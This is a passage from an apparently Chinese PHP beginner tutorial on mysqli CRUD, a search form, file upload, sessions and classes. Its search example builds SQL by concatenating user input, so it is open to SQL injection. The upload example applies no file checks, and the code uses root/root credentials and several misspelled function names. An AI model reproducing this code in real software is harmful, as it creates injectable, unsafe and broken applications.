values(数据1，数据2···);</span><br></pre></td></tr></table></figure><p><strong>执行sql语句</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> mysql_query  = &gt; 执行查询语句的函数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015143107648.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> $query = mysql_query($link, $sql);</span><br><span class="line"> var_dump($query);  //如果返回的是true则说明数据添加成功</span><br></pre></td></tr></table></figure><p><strong>整个流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> header(&quot;content-type:text/html;charset:utf-8&quot;);</span><br><span class="line"> //连接数据库</span><br><span class="line"> $link = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;a01&quot;);</span><br><span class="line"> if($link)&#123;</span><br><span class="line">     echo&quot;连接成功！&quot;;</span><br><span class="line">     mysqli_set_charset($link, &quot;utf-8&quot;);</span><br><span class="line"> //添加数据</span><br><span class="line"> //alt+enter</span><br><span class="line">     $sql =&quot;insert into user(user_id,user_name,user_pwd,user_gender,user_like,user_birthday,user_phone,user_info) values(&#x27;2&#x27;,&#x27;dora&#x27;,&#x27;789&#x27;,&#x27;2&#x27;,&#x27;0&#x27;,&#x27;2041-01-05&#x27;,&#x27;12382910550&#x27;,&#x27;hhhhh&#x27;)&quot;;</span><br><span class="line">     if(mysqli_query($link,$sql))&#123;</span><br><span class="line">     echo&quot;进去啦！&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> else&#123;</span><br><span class="line">     echo&quot;oh no&quot;;</span><br><span class="line">     //输出错误信息</span><br><span class="line">     echo mysqli_error($link);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h5 id="删"><a href="#删" class="headerlink" title="删"></a>删</h5><p>整个原理同上，sql语改一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> delete from user where user_id=2</span><br><span class="line"> //删除user_id=2的数据</span><br></pre></td></tr></table></figure><p><strong>删除过程</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> $sql2=&quot;delete from user where user_id=2&quot;;</span><br><span class="line">     if(mysqli_query($link,$sql2))&#123;</span><br><span class="line">         echo&quot;进去啦2！&lt;/br&gt;&quot;;</span><br><span class="line">     &#125;</span><br><span class="line">     else&#123;</span><br><span class="line">         echo&quot;oh no2&lt;/br&gt;&quot;;</span><br><span class="line">         //输出错误信息</span><br><span class="line">         echo mysqli_error($link);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p><strong>整个流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> header(&quot;content-type:text/html;charset:utf-8&quot;);</span><br><span class="line"> //连接数据库</span><br><span class="line"> $link = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;a01&quot;);</span><br><span class="line"> if($link)&#123;</span><br><span class="line">     echo&quot;连接成功！&lt;/br&gt;&quot;;</span><br><span class="line">     mysqli_set_charset($link, &quot;utf-8&quot;);</span><br><span class="line"> ​</span><br><span class="line">     $sql2=&quot;delete from user where user_id=2&quot;;</span><br><span class="line">     if(mysqli_query($link,$sql2))&#123;</span><br><span class="line">         echo&quot;进去啦2！&lt;/br&gt;&quot;;</span><br><span class="line">     &#125;</span><br><span class="line">     else&#123;</span><br><span class="line">         echo&quot;oh no2&lt;/br&gt;&quot;;</span><br><span class="line">         //输出错误信息</span><br><span class="line">         echo mysqli_error($link);</span><br><span class="line">     &#125;</span><br><span class="line"> ​</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h5 id="改"><a href="#改" class="headerlink" title="改"></a>改</h5><p><strong>sql语句</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> update user set user_name=&#x27;rose&#x27; where user_id = 1</span><br></pre></td></tr></table></figure><p><strong>整个流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> header(&quot;content-type:text/html;charset:utf-8&quot;);</span><br><span class="line"> //连接数据库</span><br><span class="line"> $link = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;a01&quot;);</span><br><span class="line"> if($link)&#123;</span><br><span class="line">     echo&quot;连接成功！&lt;/br&gt;&quot;;</span><br><span class="line">     mysqli_set_charset($link, &quot;utf-8&quot;);</span><br><span class="line"> //添加数据</span><br><span class="line"> //alt+enter</span><br><span class="line">     $sql2=&quot;update user set user_name=&#x27;rose&#x27;where user_id = 1&quot;;</span><br><span class="line">         if(mysqli_query($link,$sql2))&#123;</span><br><span class="line">             echo&quot;进去啦3！&lt;/br&gt;&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">         else&#123;</span><br><span class="line">             echo&quot;oh no3&lt;/br&gt;&quot;;</span><br><span class="line">             //输出错误信息</span><br><span class="line">             echo mysqli_error($link);</span><br><span class="line">             &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h5 id="查"><a href="#查" class="headerlink" title="查"></a>查</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> select * from user where ···</span><br></pre></td></tr></table></figure><p>但它有一点不一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  $sql4 = &quot;select * from user &quot;;</span><br><span class="line">     $mysqli_result=mysqli_query($link,$sql4);</span><br><span class="line">     //执行sql语句之后会得到一个结果集，而所有的数据都要通过结果集对象中获取</span><br><span class="line">     var_dump($mysqli_result);</span><br><span class="line">     //获取结果</span><br><span class="line">     $mysqli_fetch_row=mysqli_fetch_row($mysqli_result);</span><br><span class="line">     var_dump($mysqli_fetch_row);</span><br></pre></td></tr></table></figure><p>整个流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> header(&quot;content-type:text/html;charset:utf-8&quot;);</span><br><span class="line"> //连接数据库</span><br><span class="line"> $link = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;a01&quot;);</span><br><span class="line"> if($link)&#123;</span><br><span class="line">     echo&quot;连接成功！&lt;/br&gt;&quot;;</span><br><span class="line">     mysqli_set_charset($link, &quot;utf-8&quot;);</span><br><span class="line">     $sql4 = &quot;select * from user &quot;;</span><br><span class="line">     $mysqli_result=mysqli_query($link,$sql4);</span><br><span class="line">     //执行sql语句之后会得到一个结果集，而所有的数据都要通过结果集对象中获取</span><br><span class="line">     var_dump($mysqli_result);</span><br><span class="line">     //获取结果</span><br><span class="line">     $mysqli_fetch_row=mysqli_fetch_row($mysqli_result);</span><br><span class="line">     var_dump($mysqli_fetch_row);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 关于fetch，有很多种类，</span><br><span class="line"> 例如：</span><br><span class="line"> mysqli_fetch_row：只能获取一行数据</span><br><span class="line"> ​</span><br><span class="line"> mysqli_fetch_all:能获取全部数据</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015155539837-1024x230.png"></p><p>其他的自行拓展</p><h3 id="数据返回前端"><a href="#数据返回前端" class="headerlink" title="数据返回前端"></a>数据返回前端</h3><h4 id="完整前端后端交互过程"><a href="#完整前端后端交互过程" class="headerlink" title="完整前端后端交互过程"></a>完整前端后端交互过程</h4><p>用户端请求数据 -》PHP服务器脚本脚本向数据库发送sql查询 -》数据库返回需要的数据 -》php与HTML嵌套将数据呈现在前端网页上 -》用户看到数据</p><h5 id="PHP接收请求"><a href="#PHP接收请求" class="headerlink" title="PHP接收请求"></a>PHP接收请求</h5><p>先写一个简单搜索引擎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">     &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">     &lt;title&gt;前后端一次完整交互&lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> ​</span><br><span class="line"> &lt;form class=&quot;form-inline my-2 my-lg-0&quot; role=&quot;search&quot; method=&quot;get&quot; action=&quot;result.php&quot; &gt;</span><br><span class="line">     &lt;div class=&quot;input-group&quot;&gt;</span><br><span class="line">         &lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;keyword&quot; placeholder=&quot;全站检索&quot;&gt;</span><br><span class="line">         &lt;span class=&quot;input-group-btn&quot;&gt;</span><br><span class="line"> &lt;button type=&quot;submit&quot; class=&quot;btn btn-secondary&quot;&gt;搜索&lt;/button&gt;</span><br><span class="line"> &lt;/span&gt;</span><br><span class="line">     &lt;/div&gt;&lt;!-- /input-group --&gt;</span><br><span class="line"> &lt;/form&gt;</span><br><span class="line"> ​</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在result.php中接收搜索值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> header(&quot;content-type:text/html;charset:utf-8&quot;);</span><br><span class="line"> require (&quot;./demo05.php&quot;);</span><br><span class="line"> $name = $_GET[&#x27;keyword&#x27;];</span><br></pre></td></tr></table></figure><h5 id="PHP像数据库请求数据并返回前端"><a href="#PHP像数据库请求数据并返回前端" class="headerlink" title="PHP像数据库请求数据并返回前端"></a>PHP像数据库请求数据并返回前端</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $link = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;a01&quot;);</span><br><span class="line"> if($link) &#123;</span><br><span class="line">     //echo &quot;连接成功！&lt;/br&gt;&quot;;</span><br><span class="line">     mysqli_set_charset($link, &quot;utf-8&quot;);</span><br><span class="line">     $sql4 = &quot;select user_birthday from user where user_name=\&quot;&quot;.$name.&quot;\&quot;&quot;;</span><br><span class="line">     $mysqli_result=mysqli_query($link,$sql4);</span><br><span class="line">     //获取结果</span><br><span class="line">     $mysqli_fetch_all=mysqli_fetch_all($mysqli_result);</span><br><span class="line">     echo&quot;&lt;pre&gt;&quot;;</span><br><span class="line">     print_r($mysqli_fetch_all[0][0]);</span><br><span class="line">     echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h5 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/7.1-1024x250.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/7.2-1024x319.png"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><p>实现文件上传功能，首先要在<strong>php.ini</strong>中开启文件上传，并对其中的参数作出合理的设置，找到<strong>uploads</strong>项，可以看到下面三个属性值，其含义如下：</p><p><strong>file_uploads</strong>:如果是on，则说明服务器开启了文件长传功能；如果为off则关闭了文件上传功能；</p><p><strong>upload_tmp_dir</strong>:上传文件的临时目录，在文件被成功上传之前，文件首先会存放到服务器的临时目录中，不设置的为系统默认的目录</p><p><strong>upload_max_filesize</strong>：服务器允许上传的文件的最大值，以MB 为单位，系统默认为2MB。</p><p>还有几个属性也会影响：</p><p><strong>max_excution_time</strong>:PHP中一个指令所能执行的最大时间，单位是秒</p><p><strong>memory_limit</strong>:PHP中一个指令所分配的内存空间，单位是MB</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015183649383-1024x405.png"></p><h4 id="表单设置"><a href="#表单设置" class="headerlink" title="表单设置"></a>表单设置</h4><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015183814603-1024x341.png"></p><h4 id="接收文件数据"><a href="#接收文件数据" class="headerlink" title="接收文件数据"></a>接收文件数据</h4><p>根据上图中action="./upload.php"</p><p>就需要在同级目录下创建一个upload.php</p><p>注意预定义变量中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> $_FILES被广泛用于收集表单数据，接收post上传的文件数据</span><br></pre></td></tr></table></figure><p>通过$_FILES接收文件数据</p><p>在upload.php中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">     requir_once(&quot;表单所在PHP的路径&quot;);</span><br><span class="line">     echo&quot;&lt;pre&gt;&quot;;</span><br><span class="line">     print_r($_FILES);</span><br><span class="line">     echo&quot;&lt;/pre&gt;&quot;;</span><br><span class="line">     ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015191046248-1024x350.png"></p><h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><p>1.获取文件名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> $filename = $_FILES[&#x27;header&#x27;][&#x27;name&#x27;];  //从上图二维数组中获取文件名</span><br></pre></td></tr></table></figure><p>2.获取文件临时存放的文件<strong>名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> $tmpfile = $_FILES[&#x27;header&#x27;][&#x27;tmp_name&#x27;];</span><br></pre></td></tr></table></figure><p>3.准备一个文件上传的位置</p><p>先在同级目录下创建uploads文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> $uploadpath = &quot;./uploads&quot;</span><br></pre></td></tr></table></figure><p>4.开始上传</p><p>重点利用函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> move_upload_file($filename, $destination);</span><br><span class="line"> //$filename   -》文件上传的文件名</span><br><span class="line"> //$destination  -》文件要移动到的位置</span><br></pre></td></tr></table></figure><p>所以最终语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> move_upload_file($tmpfile,$uploadpath.$filename)</span><br></pre></td></tr></table></figure><h4 id="文件上传存在的问题"><a href="#文件上传存在的问题" class="headerlink" title="文件上传存在的问题"></a>文件上传存在的问题</h4><p>1.相同文件名的文件上传会存在文件覆盖（所以需要对文件进行重命名）</p><p>2.任意文件上传（对文件后缀，mime_typr，内容进行过滤）</p><p>3.所有文件放在一个文件夹会造成查找效率低下（动态的创建目录）</p><h3 id="会话机制"><a href="#会话机制" class="headerlink" title="会话机制"></a>会话机制</h3><p>为什么会有会话机制？</p><p>会话指<strong>浏览器</strong>和<strong>服务器</strong>之间的交流（<strong>前端</strong>和<strong>后端</strong>的交流）</p><h4 id="浏览器-服务器"><a href="#浏览器-服务器" class="headerlink" title="浏览器/服务器"></a>浏览器/服务器</h4><p>浏览器（客户端）：Chrome/Firefox/IE/edge</p><p>服务器（服务端）：Apache/nignx/IIS</p><h5 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h5><p>Apache(音译为阿帕奇）是世界使用排名第一的<strong>Web服务器软件</strong>。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将python/perl等解释器编译到服务器中。</p><p>有了Apache，我的电脑才能当做服务器来跑</p><p>基于<strong>BS架构</strong>的系统：</p><p>B：browser 浏览器</p><p>S : server 服务器</p><p>客户端和服务端之间传输需要一个<strong>协议</strong>：http协议/https协议</p><h4 id="COOKIE-SESSION"><a href="#COOKIE-SESSION" class="headerlink" title="COOKIE/SESSION"></a>COOKIE/SESSION</h4><p>会话包含两种：</p><p><strong>COOKIE</strong>：存放在客服端（浏览器）</p><p><strong>SEESION</strong>:存放在服务端（服务器）</p><p>可以理解为，在超市里办理一张会员卡。</p><p>1.店员给我一张卡，也就是cookie。不安全，会被偷</p><p>2.线上办理，这张可有一个唯一的标识。我只需要报电话号码就可以享受会员折扣。而真实的信息是存放在店员电脑中的</p><p>而这个唯一的标识比如手机号，在BS架构中是怎么传输的？ ---->cookie传输</p><h4 id="SESSION会话"><a href="#SESSION会话" class="headerlink" title="$_SESSION会话"></a>$_SESSION会话</h4><p>是存放在服务器的</p><p>使用步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> //1.开启session</span><br><span class="line"> session_start();</span><br><span class="line"> //2.存放数据</span><br><span class="line"> //通常是在登陆成功之后</span><br><span class="line"> $_SESSION[&#x27;key&#x27;]=value;</span><br><span class="line"> //保存用户的状态数据</span><br><span class="line"> //将用户名存放在SESSION中</span><br><span class="line"> $_SESSION[&#x27;userName&#x27;] = $userName;</span><br><span class="line"> //3.保存数据之后，这个SESSION数据的作用在于整个网站</span><br><span class="line"> //在其他页面使用SESSION的时候也得开启session  session_start</span><br><span class="line"> //销毁session</span><br><span class="line"> &#123;</span><br><span class="line"> 1，关闭浏览器</span><br><span class="line"> 2，unsettle($_SESSION[&#x27;userName&#x27;])</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="PHP面向对象"><a href="#PHP面向对象" class="headerlink" title="PHP面向对象"></a>PHP面向对象</h3><h4 id="概念的引入"><a href="#概念的引入" class="headerlink" title="概念的引入"></a>概念的引入</h4><p>面向对象？万物皆对象;接触到的所有东西都是对象，任何事物都有分类。</p><p>为什么学面向对象？</p><p>1.需要具备面向对象的编程思维</p><p>2.需要能看懂面向对象的语法 =》代码审计</p><p>3.相关漏洞需要面向对象的知识 =》反序列化</p><h4 id="面向过程与面向对象"><a href="#面向过程与面向对象" class="headerlink" title="面向过程与面向对象"></a>面向过程与面向对象</h4><p>面向对象更方便，效率更低，消耗内存大，拓展性好</p><p>面向过程更繁琐，效率更高，消耗内存更低，拓展性差</p><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><p>在程序里，<strong>先有类才有对象</strong>。 类 =》模板</p><p>创建<strong>类</strong>的关键字：<strong>class</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015203142877.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015203216865.png" style="zoom:50%;" /><h5 id="创建类的格式"><a href="#创建类的格式" class="headerlink" title="创建类的格式"></a>创建类的格式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> class 类名</span><br><span class="line"> &#123;</span><br><span class="line">     //常量</span><br><span class="line">     修饰值 $属性名=属性值（可以不初始化值）; </span><br><span class="line">     //属性</span><br><span class="line">     //构造器</span><br><span class="line">     //方法</span><br><span class="line">     修饰值 function name()&#123;</span><br><span class="line">         方法体;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;    </span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><h5 id="创建类的实例"><a href="#创建类的实例" class="headerlink" title="创建类的实例"></a>创建类的实例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> ​</span><br><span class="line"> /**</span><br><span class="line">  * 这是一个人类</span><br><span class="line">  * Class People</span><br><span class="line">  */</span><br><span class="line"> class People          //规定：类名首字母大写</span><br><span class="line"> &#123;</span><br><span class="line"> //常量</span><br><span class="line"> //属性：修饰一个对象的名词  (可以直观理解为就是一个变量，知识这个变量放到了类里面（成员变量）)</span><br><span class="line"> //属性有修饰值：public，private，protected</span><br><span class="line"> public $name;</span><br><span class="line"> public $age;</span><br><span class="line"> public $gender;</span><br><span class="line"> public $address=&quot;四川成都&quot;;</span><br><span class="line"> //构造器</span><br><span class="line"> //方法：修饰一个对象的动词</span><br><span class="line"> //吃饭的方法</span><br><span class="line"> public function eat()&#123;</span><br><span class="line">     echo&quot;干饭！&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> //睡觉的方法</span><br><span class="line"> public function sleep()&#123;</span><br><span class="line">     echo&quot;睡大觉！&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h5 id="类的实例化"><a href="#类的实例化" class="headerlink" title="类的实例化"></a>类的实例化</h5><p>类的实例化，关键字就是如何去使用这个类</p><p>关键字：new</p><p>实例化一个类 =》得到的是对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> //引入：把有类的文件包含进去</span><br><span class="line"> require_once(&quot;./people.php&quot;);</span><br><span class="line"> //实例化一个类</span><br><span class="line"> $people = new People();</span><br><span class="line"> echo&quot;&lt;pre&gt;&quot;;</span><br><span class="line"> print_r($people);</span><br><span class="line"> echo&quot;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015210309499.png"></p><h5 id="调用属性"><a href="#调用属性" class="headerlink" title="调用属性"></a>调用属性</h5><p>field：（属性）字段</p><p>$类名->属性名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> echo ($people -&gt;age);      //18</span><br></pre></td></tr></table></figure><h5 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> $people-&gt;eat(); </span><br></pre></td></tr></table></figure><h5 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h5><p>构造器是构造对象时，要调用的一个方法。核心作用是初始化一个数据（自动调用）</p><p>不重写构造器的情况？</p><p>-》创建出来的对象都是一样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> //构造器</span><br><span class="line"> function __construct($age)</span><br><span class="line"> &#123;</span><br><span class="line"> $this-&gt;age=$age;         //$this,伪对象，表示当前这个对象</span><br><span class="line"> &#125;</span><br><span class="line"> //构造器写法固定，本质就是__construct()这个模式方法。</span><br><span class="line"> //构造器在实例化一个类构造出一个对象时调用</span><br></pre></td></tr></table></figure><p>这样每次创建出来的对象就可以控制，改变了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> require_once(&quot;./people.php&quot;);</span><br><span class="line"> //实例化一个类</span><br><span class="line"> $people = new People(17);</span><br><span class="line"> echo&quot;&lt;pre&gt;&quot;;</span><br><span class="line"> print_r($people);</span><br><span class="line"> echo&quot;&lt;/pre&gt;&quot;;</span><br><span class="line"> $people = new People(18);</span><br><span class="line"> echo&quot;&lt;pre&gt;&quot;;</span><br><span class="line"> print_r($people);</span><br><span class="line"> echo&quot;&lt;/pre&gt;&quot;;</span><br><span class="line"> $people = new People(19);</span><br><span class="line"> echo&quot;&lt;pre&gt;&quot;;</span><br><span class="line"> print_r($people);</span><br><span class="line"> echo&quot;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015211918427.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql</title>
      <link href="/2023/05/14/mysql/"/>
      <url>/2023/05/14/mysql/</url>
      
